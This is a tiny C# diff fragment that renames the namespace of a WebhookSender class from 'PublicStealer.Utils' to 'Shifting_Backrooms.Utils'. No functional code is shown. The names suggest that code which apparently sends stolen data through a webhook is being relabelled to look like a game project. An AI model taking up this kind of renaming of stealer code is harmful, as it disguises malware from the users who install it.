@@ -3,7 +3,7 @@ using System.IO;
 using System.Net.Http;
 using System.Threading.Tasks;
 
-namespace PublicStealer.Utils
+namespace Shifting_Backrooms.Utils
 {
     public static class WebhookSender
     {
